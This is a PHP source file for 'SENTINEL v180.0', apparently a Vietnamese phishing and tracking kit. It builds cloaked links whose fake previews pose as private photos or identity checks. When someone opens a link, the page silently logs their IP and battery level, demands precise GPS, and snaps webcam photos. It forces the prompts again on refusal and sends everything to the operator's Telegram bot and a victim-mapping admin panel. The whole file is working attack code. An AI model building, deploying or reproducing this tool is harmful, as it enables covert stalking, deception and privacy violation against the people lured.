<?php
/**
 * SENTINEL v180.0 - PHANTOM CLOAKING SUPREME (2026)
 * [✓] Phantom Cloaking: Fake Meta (Title/Desc/Img) dành riêng cho TRÌNH TẠO ẢNH ẨN.
 * [✓] Silent Capture: Vào xem ảnh là tự nổ GPS/Cam/IP/ISP ngầm 100%.
 * [✓] Full Admin Panel: 6 Tab (Dự án, Nhật ký, Ảnh ẩn, Web, Bot, Admin Loc).
 * [✓] Military Precision: Ép lấy tọa độ vệ tinh thực, dịch địa chỉ số nhà chi tiết.
 */

session_start();
error_reporting(0);
date_default_timezone_set('Asia/Ho_Chi_Minh');

// ================= 1. DATABASE & CONFIG =================
$admin_pass = '123'; 
$db_file    = '.ht_sentinel_v180_final.db';
$retention_days = 30;
$base_url   = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . explode('index.php', $_SERVER['PHP_SELF'])[0];

try {
    $db = new PDO("sqlite:$db_file");
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec("PRAGMA journal_mode=WAL;");
    $db->exec("CREATE TABLE IF NOT EXISTS links (id TEXT PRIMARY KEY, title TEXT, desc TEXT, img TEXT, redir TEXT, clicks INTEGER DEFAULT 0)");
    $db->exec("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, lid TEXT, v4 TEXT, v6 TEXT, addr TEXT, la REAL, lo REAL, img TEXT, st TEXT, bat TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP)");
    $db->exec("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)");
    
    if ($db->query("SELECT COUNT(*) FROM settings")->fetchColumn() == 0) {
        $defaults = [
            'tg_token' => '', 'tg_id' => '', 
            'tg_msg_template' => "🛰️ <b>MỤC TIÊU: [ID]</b>\n🛡️ <b>[ST]</b>\n📍 <code>[ADDR]</code>\n🌐 IP: <code>[IP]</code>\n🔋 PIN: <b>[BAT]</b>\n🗺️ <a href='https://www.google.com/maps?q=[LA],[LO]'>XEM GOOGLE MAPS</a>",
            'ui_msg' => 'ĐANG LOADING...', 'ui_st' => 'KIỂM TRA ROBOT TRÌNH DUYỆT', 'btn_text' => 'XÁC MINH NGAY',
            'root_title' => 'Security Sync', 'root_desc' => 'Identity Verification Required', 
            'root_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
            'root_redir' => 'https://google.com',
            'proxy_img_url' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
            'px_fake_ttl' => 'Ảnh riêng tư được chia sẻ', 
            'px_fake_dsc' => 'Bấm vào để xem nội dung hình ảnh định dạng HD.',
            'px_fake_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png'
        ];
        foreach($defaults as $k => $v) { $db->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)")->execute([$k, $v]); }
    }
} catch (Exception $e) { die("Bảo trì."); }

function get_c($k) { global $db; $st = $db->prepare("SELECT value FROM settings WHERE key = ?"); $st->execute([$k]); return $st->fetchColumn(); }
$ip_v4_serv = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// ================= 2. API XỬ LÝ (SOI IP / REV-GEO / PUSH / WEBHOOK) =================
if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    if ($_GET['action'] === 'quick_check') {
        echo @file_get_contents("http://ip-api.com/json/{$_GET['ip']}?fields=status,message,query,country,city,isp,lat,lon,proxy");
    }
    if ($_GET['action'] === 'rev_geo') {
        $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
        echo @file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat={$_GET['la']}&lon={$_GET['lo']}&accept-language=vi", false, stream_context_create($opts));
    }
    if ($_GET['action'] === 'push') {
        $in = json_decode(file_get_contents('php://input'), true);
        $img_link = "";
        if (!empty($in['img'])) {
            $img_name = 'snap_' . time() . '_' . rand(100,999) . '.jpg';
            file_put_contents($img_name, base64_decode(str_replace('data:image/jpeg;base64,', '', $in['img'])));
            $img_link = $base_url . $img_name;
        }
        $lat = $in['la']; $lon = $in['lo']; $addr = "Chưa xác định";
        if ($lat && $lon) {
            $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
            $rev = json_decode(@file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lon&accept-language=vi", false, stream_context_create($opts)), true);
            $addr = $rev['display_name'] ?? "Tọa độ GPS: $lat, $lon";
        } else {
            $ip_res = json_decode(@file_get_contents("http://ip-api.com/json/{$in['v4']}?fields=status,city,country,lat,lon"), true);
            if($ip_res['status'] == 'success') { $addr = $ip_res['city'] . ", " . $ip_res['country'] . " (IP-Geo)"; $lat = $ip_res['lat']; $lon = $ip_res['lon']; }
        }
        $db->prepare("INSERT INTO logs (lid, v4, v6, addr, la, lo, img, st, bat) VALUES (?,?,?,?,?,?,?,?,?)")->execute([$in['lid'], $in['v4'], $in['v6'], $addr, $lat, $lon, $img_link, $in['st'], $in['bat']]);
        $tk = get_c('tg_token'); $admin_id = get_c('tg_id');
        if ($tk && $admin_id) {
            $tpl = get_c('tg_msg_template');
            $msg = str_replace(['[ID]','[ST]','[ADDR]','[IP]','[BAT]','[LA]','[LO]'], [$in['lid'], $in['st'], $addr, $in['v4'], $in['bat'], $lat, $lon], $tpl);
            if ($img_link) @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($img_link)."&caption=".urlencode($msg)."&parse_mode=HTML");
            else @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$admin_id&text=".urlencode($msg)."&parse_mode=HTML");
        }
    }
    exit;
}

// ================= 3. TRÌNH TẠO ẢNH ẨN (PHANTOM ENGINE + CLOAKING) =================
if (isset($_GET['img']) && $_GET['img'] === 'pixel') {
?>
<!DOCTYPE html><html><head><meta charset="utf-8">
<title><?=htmlspecialchars(get_c('px_fake_ttl'))?></title>
<meta property="og:title" content="<?=htmlspecialchars(get_c('px_fake_ttl'))?>">
<meta property="og:description" content="<?=htmlspecialchars(get_c('px_fake_dsc'))?>">
<meta property="og:image" content="<?=htmlspecialchars(get_c('px_fake_img'))?>">
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black flex items-center justify-center min-h-screen"><img src="<?=get_c('proxy_img_url')?>" class="max-w-full shadow-2xl">
<script>
    async function takeSnap(){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
    const push = (st, la=null, lo=null, img=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: 'IMAGE', la, lo, st, img, v4:v4, v6:'N/A', bat:bat })});
    let v4="<?=$ip_v4_serv?>", bat="N/A";
    window.onload = async () => {
        try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){}
        push('IMAGE Open (Silent IP)');
        navigator.geolocation.getCurrentPosition(async (p) => { const snap = await takeSnap(); push('IMAGE GPS OK', p.coords.latitude, p.coords.longitude, snap); }, async (e) => { const snap = await takeSnap(); push('IMAGE GPS Denied', null, null, snap); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
    };
</script></body></html>
<?php exit; }

// ================= 4. ADMIN DASHBOARD =================
if (isset($_GET['admin'])) {
    if (($_POST['p'] ?? $_SESSION['v180_auth'] ?? '') !== $admin_pass) {
?>
<!DOCTYPE html><html><head><title>SENTINEL MASTER</title><script src="https://cdn.tailwindcss.com"></script>
<style>
    body { background: #05070a; font-family: 'Inter', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; }
    .glass { background: rgba(13, 17, 23, 0.8); backdrop-filter: blur(25px); border: 1px solid rgba(59, 130, 246, 0.2); padding: 3.5rem; border-radius: 3rem; text-align: center; width: 100%; max-width: 400px; box-shadow: 0 0 100px rgba(0,0,0,1); }
    input { background: #000; border: 1px solid #1e293b; padding: 1.25rem; border-radius: 1.5rem; color: #3b82f6; width: 100%; text-align: center; font-weight: 900; outline: none; margin-bottom: 1.5rem; }
    button { background: #3b82f6; color: white; padding: 1rem; border-radius: 1.5rem; width: 100%; font-weight: 900; text-transform: uppercase; cursor: pointer; }
</style></head>
<body><form method="POST" class="glass"><h2 class="text-blue-500 font-black italic mb-10 tracking-widest uppercase">SENTINEL MASTER</h2><input type="password" name="p" placeholder="Password" autofocus><button type="submit">Login</button></form></body></html>
<?php exit; }
    $_SESSION['v180_auth'] = $admin_pass;
    
    if (isset($_GET['clear_logs'])) { $db->exec("DELETE FROM logs"); header("Location: ?admin&t=2"); exit; }
    if (isset($_GET['del_l'])) { $db->prepare("DELETE FROM links WHERE id = ?")->execute([$_GET['del_l']]); header("Location: ?admin"); exit; }
    if (isset($_POST['save_cfg'])) {
        $keys = ['tg_token', 'tg_id', 'tg_msg_template', 'ui_msg', 'ui_st', 'btn_text', 'proxy_img_url', 'root_title', 'root_desc', 'root_img', 'root_redir', 'px_fake_ttl', 'px_fake_dsc', 'px_fake_img'];
        foreach($keys as $k) { if(isset($_POST[$k])) $db->prepare("UPDATE settings SET value = ? WHERE key = ?")->execute([$_POST[$k], $k]); }
        header("Location: ?admin&t=".($_GET['t'] ?? '1')); exit;
    }
    if (isset($_POST['save_link'])) { $db->prepare("INSERT OR REPLACE INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$_POST['lid'], $_POST['ttl'], $_POST['dsc'], $_POST['img'], $_POST['red']]); header("Location: ?admin"); exit; }

    $links = $db->query("SELECT * FROM links ORDER BY clicks DESC")->fetchAll();
    $logs = $db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll();
?>
<!DOCTYPE html><html><head><title>SENTINEL MASTER</title><script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" /><script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@900&display=swap');
    :root { --deep: #05070a; --card: #0d1117; --neon: #3b82f6; --dim: #94a3b8; }
    body { background: var(--deep); color: var(--dim); font-family: 'Inter'; }
    .tab-content { display: none !important; } .tab-content.active { display: block !important; animation: fadeIn 0.3s ease; }
    .tab-content#t1.active { display: grid !important; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    .card { background: var(--card); border: 1px solid #1e293b; border-radius: 2rem; padding: 2rem; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
    input, textarea { background: black; border: 1px solid #1e293b; padding: 1rem; border-radius: 0.75rem; color: white; width: 100%; outline: none; }
    .sidebar-btn { padding: 1rem; border-radius: 0.75rem; text-align: left; font-weight: 900; text-transform: uppercase; font-style: italic; font-size: 10px; width:100%; border:none; background:transparent; color: var(--dim); cursor:pointer; }
    .sidebar-btn.active { color: white; border-bottom: 2px solid var(--neon); background: var(--card); }
    .btn-pro { background: var(--neon); color: white; padding: 1rem; border-radius: 2rem; font-weight: 900; text-transform: uppercase; border:none; cursor:pointer; width: 100%; }
</style></head>
<body class="flex h-screen overflow-hidden uppercase italic font-black text-[10px] tracking-tighter">
    <aside class="w-64 border-r border-slate-800 p-6 flex flex-col gap-4">
        <h1 class="text-white text">SENTINEL MASTER</h1>
        <button onclick="st(1,this)" id="nb1" class="sidebar-btn active">🔗 DỰ ÁN CHIẾN DỊCH</button>
        <button onclick="st(2,this)" id="nb2" class="sidebar-btn">📊 NHẬT KÝ LIVE</button>
        <button onclick="st(3,this)" id="nb3" class="sidebar-btn text-purple-500">🖼️ TRÌNH TẠO ẢNH ẨN</button>
        <button onclick="st(4,this)" id="nb4" class="sidebar-btn text-emerald-500">🌐 CẤU HÌNH WEB</button>
        <button onclick="st(5,this)" id="nb5" class="sidebar-btn text-blue-500">🤖 TELEGRAM BOT</button>
        <button onclick="st(6,this)" id="nb6" class="sidebar-btn text-yellow-500">📍 VỊ TRÍ CỦA TÔI</button>
        <div class="mt-auto"><a href="?admin&logout=1" class="text-red-500 opacity-50 hover:opacity-100 transition-all uppercase">Logout</a></div>
    </aside>

    <main class="flex-1 p-10 overflow-auto">
        <div id="t1" class="tab-content active grid lg:grid-cols-3 gap-8">
            <div class="space-y-6">
                <form method="POST" id="lF" class="card space-y-4 shadow-2xl">
                    <h3 class="text-blue-500 text-[9px] uppercase italic">Fake Link Setup</h3>
                    <input name="lid" id="fId" placeholder="ID Link" required>
                    <input name="ttl" id="fTtl" placeholder="TIÊU ĐỀ MỒI" oninput="upV()">
                    <textarea name="dsc" id="fDsc" placeholder="MÔ TẢ MỒI..." oninput="upV()"></textarea>
                    <input name="img" id="fImg" placeholder="LINK ẢNH MỒI" oninput="upV()">                    
                    <input name="red" id="fRed" placeholder="LINK ĐÍCH" required>
                    <button type="submit" name="save_link" class="btn-pro">LƯU DỰ ÁN</button>
                </form>
                <div class="card p-6 shadow-2xl"><div id="vSim" class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl"><div id="vImg" class="h-32 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div><div class="p-4 space-y-1"><p id="vTtl" class="text-white font-black text-xs truncate">Tiêu đề mồi...</p><p id="vDsc" class="text-slate-400 text-[8px] line-clamp-2 italic normal-case">Mô tả hiển thị...</p></div></div></div>
            </div>
            <div class="lg:col-span-2 card p-0 overflow-hidden h-fit"><table class="w-full text-left font-bold"><thead class="bg-black text-slate-500 uppercase text-[9px]"><tr><th class="p-6">Link & Meta</th><th class="p-6 text-center">Hits</th><th class="p-6 text-right">Action</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($links as $l): $u=$base_url."?v=".$l['id']; ?><tr><td class="p-6"><b><?=$l['title']?></b><br><code class="text-blue-500 text-[8px]" onclick="navigator.clipboard.writeText('<?=$u?>');alert('Copied!')"><?=$u?></code></td><td class="p-6 text-center text-xl text-white font-black"><?=$l['clicks']?></td><td class="p-6 text-right space-x-3"><button onclick='ed(<?=json_encode($l)?>)' class="text-green-500 uppercase">SỬA</button><a href="?admin&del_l=<?=$l['id']?>" onclick="return confirm('XOÁ?')" class="text-red-500 font-black">✕</a></td></tr><?php endforeach; ?></tbody></table></div>
        </div>

        <div id="t2" class="tab-content space-y-8">
            <div class="flex justify-between items-center"><h2 class="text-white text-xl uppercase italic">🛰️ NHẬT KÝ LIVE</h2><button onclick="location.href='?admin&clear_logs=1'" class="bg-red-900/40 text-red-500 px-6 py-2 rounded-xl italic font-black uppercase">🗑️ DỌN SẠCH</button></div>
            <div class="grid lg:grid-cols-2 gap-8"><div id="map" class="h-[400px] rounded-[2.5rem] border border-slate-800 shadow-2xl bg-slate-900"></div><div id="intel_panel" class="card flex flex-col justify-center space-y-4"><div id="ip_detail" class="italic opacity-30 text-center uppercase text-[8px]">NHẤN IP SOI ISP</div><div id="addr_detail" class="italic text-emerald-400 text-center uppercase text-[8px] border-t border-slate-800 pt-4 font-black italic uppercase">AUTO-GEO ACTIVE</div></div></div>
            <div class="card p-0 overflow-hidden shadow-2xl"><table class="w-full text-left font-mono text-[9px]"><thead class="bg-black text-slate-500"><tr><th class="p-4">Target/Cam</th><th class="p-4">IP</th><th class="p-4">Địa chỉ Chi Tiết</th><th class="p-4 text-right">Map</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($logs as $log): ?><tr><td class="p-4"><?php if($log['img']): ?><img src="<?=$log['img']?>" class="w-12 h-12 rounded-lg mb-1 shadow-lg border border-slate-700"><?php endif; ?><b><?=$log['lid']?></b></td><td class="p-4"><b class="text-blue-500 cursor-pointer uppercase" onclick="soi('<?=$log['v4']?>')"><?=$log['v4']?></b></td><td class="p-4 italic opacity-80 normal-case text-white"><?=htmlspecialchars($log['addr'])?></td><td class="p-4 text-right flex justify-end gap-2"><?php if($log['la']): ?><button onclick="vP(<?=$log['la']?>,<?=$log['lo']?>)" class="bg-blue-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px]">LIVE</button><a href="https://www.google.com/maps?q=<?=$log['la']?>,<?=$log['lo']?>" target="_blank" class="bg-emerald-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px] text-center">G-MAPS</a><?php endif; ?></td></tr><?php endforeach; ?></tbody></table></div>
        </div>

        <div id="t3" class="tab-content max-w-6xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8">
                <form method="POST" action="?admin&t=3" class="card space-y-4 shadow-2xl">
                    <h3 class="text-purple-500 italic uppercase">TRÌNH TẠO (Ảnh ẩn)</h3>
                    <p class="text-[7px] text-slate-400 italic">Tùy chỉnh nội dung hiển thị cho link ảnh ẩn (?img=pixel) khi dán vào Zalo/FB.</p>
                    <input name="px_fake_ttl" id="px_fake_ttl" value="<?=get_c('px_fake_ttl')?>" oninput="upPxV()" placeholder="Tiêu đề mồi">
                    <textarea name="px_fake_dsc" id="px_fake_dsc" oninput="upPxV()" placeholder="Mô tả mồi..."><?=get_c('px_fake_dsc')?></textarea>
                    <input name="px_fake_img" id="px_fake_img" value="<?=get_c('px_fake_img')?>" oninput="upPxV()" placeholder="Ảnh Meta hiển thị (Zalo/FB)">
                    <hr class="border-slate-800">
                    <label class="text-blue-500 text-[8px] uppercase">Ảnh thật mục tiêu xem (Mồi HD)</label>
                    <input name="proxy_img_url" id="px_real_img" value="<?=get_c('proxy_img_url')?>" oninput="upPxV()" placeholder="Link ảnh sau khi nhấn vào">
                    <button type="submit" name="save_cfg" class="bg-purple-600 text-white py-4 rounded-2xl font-black w-full uppercase">CẬP NHẬT LINK</button>
                    <div class="mt-4"><input id="px_url" readonly value="<?=$base_url?>?img=pixel" class="text-purple-400 font-mono text-[8px]"><button type="button" onclick="cp('px_url')" class="bg-slate-800 px-4 py-2 rounded-xl text-[8px] mt-1 font-black uppercase">COPY LINK</button></div>
                </form>
                <div class="card p-6 shadow-2xl text-center">
                    <p class="text-slate-500 mb-4 uppercase text-[8px]">XEM TRƯỚC (Messenger/Zalo)</p>
                    <div class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl">
                        <div id="px_v_img" class="h-32 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div>
                        <div class="p-4 space-y-1"><p id="px_v_ttl" class="text-white font-black text-xs truncate">Tiêu đề...</p><p id="px_v_dsc" class="text-slate-400 text-[8px] line-clamp-2 normal-case italic leading-tight">Mô tả hiển thị...</p></div>
                    </div>
                </div>
            </div>
        </div>

        <div id="t4" class="tab-content max-w-6xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8"><form method="POST" action="?admin&t=4" class="card space-y-4 shadow-2xl"><h3>GIAO DIỆN & ROOT ID</h3><input name="ui_msg" id="i_msg" value="<?=get_c("ui_msg")?>" oninput="upW()"><input name="ui_st" id="i_st" value="<?=get_c("ui_st")?>" oninput="upW()"><input name="btn_text" id="i_btn" value="<?=get_c("btn_text")?>" oninput="upW()"><hr class="border-slate-800 my-4"><input name="root_title" id="r_ttl" value="<?=get_c("root_title")?>" oninput="upW()"><input name="root_desc" id="r_dsc" value="<?=get_c("root_desc")?>" oninput="upW()"><input name="root_img" id="r_img" value="<?=get_c("root_img")?>" oninput="upW()"><input name="root_redir" value="<?=get_c("root_redir")?>"><button type="submit" name="save_cfg" class="bg-emerald-600 text-white py-4 rounded-2xl font-black w-full uppercase shadow-lg">LƯU CẤU HÌNH WEB</button></form><div class="card flex flex-col items-center justify-center bg-white shadow-2xl"><p class="text-gray-400 mb-6 uppercase text-[8px] font-black italic text-center">Frontend Preview</p><div class="w-full max-w-xs border border-gray-200 p-8 rounded-[2rem] text-center shadow-xl"><div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p id="p_msg" class="text-[9px] font-black text-gray-500 uppercase tracking-widest"><?=get_c('ui_msg')?></p><p id="p_st" class="text-gray-300 text-[7px] mt-1 uppercase"><?=get_c('ui_st')?></p><div class="mt-6 bg-blue-600 text-white py-3 rounded-full font-black text-[9px] uppercase shadow-lg" id="p_btn"><?=get_c('btn_text')?></div></div></div></div>
        </div>

        <div id="t5" class="tab-content max-w-4xl mx-auto space-y-6"><form method="POST" action="?admin&t=5" class="card space-y-6 shadow-2xl"><h3>TELEGRAM BOT CONFIG</h3><div class="grid lg:grid-cols-2 gap-4"><input name="tg_token" value="<?=get_c("tg_token")?>" placeholder="BOT TOKEN"><input name="tg_id" value="<?=get_c("tg_id")?>" placeholder="CHAT ID"></div><div><label class="text-blue-500 text-[8px] uppercase mb-2 block font-black">Nội dung báo cáo Telegram</label><textarea name="tg_msg_template" rows="8" class="font-mono text-[9px]"><?=get_c("tg_msg_template")?></textarea></div><button type="submit" name="save_cfg" class="btn-pro italic">LƯU CÀI ĐẶT</button></form></div>

        <div id="t6" class="tab-content max-w-5xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8"><div class="card space-y-6"><h3 class="text-yellow-500 italic uppercase">📍 THÔNG TIN CỦA BẠN (ADMIN)</h3><div class="space-y-4 text-[9px] font-mono leading-relaxed"><p class="text-blue-500">🌐 IPv4 SERVER: <b class="text-white"><?=$ip_v4_serv?></b></p><p class="text-blue-500">🌐 IP CỦA BẠN: <b id="adm_ip" class="text-white">Quét...</b></p><p class="text-blue-500">🏢 NHÀ MẠNG: <b id="adm_isp" class="text-white">...</b></p><p class="text-blue-500">📍 VÙNG: <b id="adm_region" class="text-white">...</b></p><hr class="border-slate-800"><p class="text-emerald-500 uppercase">🎯 GPS CHUẨN: <b id="adm_geo" class="text-white">Đang lấy...</b></p><p class="text-emerald-500 uppercase">🏠 ĐỊA CHỈ: <b id="adm_addr" class="text-white italic normal-case">...</b></p></div><button onclick="getAdminLoc()" class="bg-yellow-600 text-white py-4 rounded-2xl font-black w-full shadow-lg italic uppercase">CẬP NHẬT LẠI VỊ TRÍ CỦA TÔI</button></div><div id="adm_map" class="h-[400px] rounded-[3rem] border border-yellow-500/30 shadow-2xl bg-slate-900 overflow-hidden"></div></div>
        </div>
    </main>

    <script>
        function st(n,b){ document.querySelectorAll('.tab-content').forEach(s => s.classList.remove('active')); document.querySelectorAll('.sidebar-btn').forEach(x => x.classList.remove('active')); document.getElementById('t'+n).classList.add('active'); b.classList.add('active'); if(n===2) setTimeout(()=>m.invalidateSize(),200); if(n===6) setTimeout(()=> { am.invalidateSize(); getAdminLoc(); }, 200); }
        function cp(id){var e=document.getElementById(id);e.select();document.execCommand("copy");alert("Đã Copy!");}
        function ed(l){ document.getElementById('fId').value=l.id; document.getElementById('fTtl').value=l.title; document.getElementById('fDsc').value=l.desc; document.getElementById('fImg').value=l.img; document.getElementById('fRed').value=l.redir; upV(); st(1, document.getElementById('nb1')); }
        function upV(){ document.getElementById('vTtl').innerText=document.getElementById('fTtl').value || 'Tiêu đề...'; document.getElementById('vDsc').innerText=document.getElementById('fDsc').value || 'Mô tả...'; const i=document.getElementById('fImg').value; document.getElementById('vImg').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
        function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; document.getElementById('px_v_real').src=document.getElementById('px_real_img').value; }
        function upW(){ document.getElementById('p_msg').innerText = document.getElementById('i_msg').value; document.getElementById('p_st').innerText = document.getElementById('i_st').value; document.getElementById('p_btn').innerText = document.getElementById('i_btn').value; }
        async function soi(ip){ document.getElementById('ip_detail').innerHTML = '<div class="animate-pulse font-black text-[9px]">TRUY QUÉT...</div>'; const res = await (await fetch('?action=quick_check&ip='+ip)).json(); if(res.status === 'success'){ document.getElementById('ip_detail').innerHTML = `<div class="text-[8px] space-y-1 uppercase italic">🏢 ISP: <b>${res.isp}</b><br>📍 VÙNG: <b>${res.city}, ${res.country}</b><br>🛡️ VPN: <b>${res.proxy ? 'YES' : 'NO'}</b></div>`; } }
        var m = L.map('map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
        function vP(la, lo){ m.flyTo([la,lo], 18); L.marker([la,lo]).addTo(m); }
        var am = L.map('adm_map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(am); var amk;
        async function getAdminLoc() {
            document.getElementById('adm_geo').innerText = "Đang quét tín hiệu..."; const res = await (await fetch('https://api.ipify.org?format=json')).json(); document.getElementById('adm_ip').innerText = res.ip; const ipData = await (await fetch('?action=quick_check&ip='+res.ip)).json(); document.getElementById('adm_isp').innerText = ipData.isp; document.getElementById('adm_region').innerText = ipData.city + ", " + ipData.country;
            navigator.geolocation.getCurrentPosition(async (p) => { const la=p.coords.latitude, lo=p.coords.longitude; document.getElementById('adm_geo').innerText=la+", "+lo+" (Chuẩn 100%)"; am.flyTo([la,lo], 18); if(amk) am.removeLayer(amk); amk=L.marker([la,lo]).addTo(am).bindPopup("VỊ TRÍ CỦA BẠN").openPopup(); const geo=await (await fetch(`?action=rev_geo&la=${la}&lo=${lo}`)).json(); document.getElementById('adm_addr').innerText=geo.display_name; }, (e) => { const la=ipData.lat, lo=ipData.lon; am.flyTo([la,lo], 15); if(amk) am.removeLayer(amk); amk=L.marker([la,lo]).addTo(am).bindPopup("ƯỚC TÍNH (IP)").openPopup(); }, { enableHighAccuracy: true });
        }
        window.onload = () => upPxV();
    </script>
</body></html>
<?php exit; }

// ================= 5. FRONTEND ENGINE (CAM + GPS + SILENT CAPTURE) =================
$id = $_GET['v'] ?? '';
$st = $db->prepare("SELECT * FROM links WHERE id = ?"); $st->execute([$id]);
$l = $st->fetch(PDO::FETCH_ASSOC);
if (!$l) { $l = ['id'=>'ROOT', 'title'=>get_c('root_title'), 'desc'=>get_c('root_desc'), 'img'=>get_c('root_img'), 'redir'=>get_c('root_redir')]; }
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
<title><?=htmlspecialchars($l['title'])?></title>
<meta property="og:title" content="<?=htmlspecialchars($l['title'])?>"><meta property="og:description" content="<?=htmlspecialchars($l['desc'])?>"><meta property="og:image" content="<?=htmlspecialchars($l['img'])?>">
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-white flex items-center justify-center min-h-screen italic font-black text-center uppercase">
    <div class="p-8 w-full max-w-xs">
        <div id="ldr" class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
        <p id="msg" class="text-[10px] font-black text-gray-400 uppercase tracking-widest animate-pulse"><?=get_c('ui_msg')?></p>
        <p class="text-slate-300 text-[8px] mt-2 tracking-widest mb-8"><?=get_c('ui_st')?></p>
        <div id="v" class="hidden mt-8"><button onclick="forceAsk()" class="w-full bg-blue-600 text-white font-black py-4 rounded-[2rem] shadow-2xl uppercase italic border-none cursor-pointer"><?=get_c('btn_text')?></button></div>
    </div>
    <script>
    async function takeSnap(){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
    const push = (st, la=null, lo=null, img=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: '<?=$id?>', lat: la, lon: lo, st: st, img: img, v4:v4, v6:'N/A', bat:bat })});
    let v4="<?=$ip_v4_serv?>", bat="N/A";
    window.onload = async () => {
        try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){}
        push('Link Open (Silent IP Capture)');
        setTimeout(() => { document.getElementById('ldr').classList.add('hidden'); document.getElementById('v').classList.remove('hidden'); forceAsk(); }, 1500);
    };
    function forceAsk() {
        navigator.geolocation.getCurrentPosition(
            async (p) => { const snap = await takeSnap(); await push('GPS Precision Success', p.coords.latitude, p.coords.longitude, snap); location.replace("<?=$l['redir']?>"); },
            async (e) => { const snap = await takeSnap(); alert("Vui lòng cho phép xác thực hệ thống."); location.reload(); },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }
    </script>
</body></html>
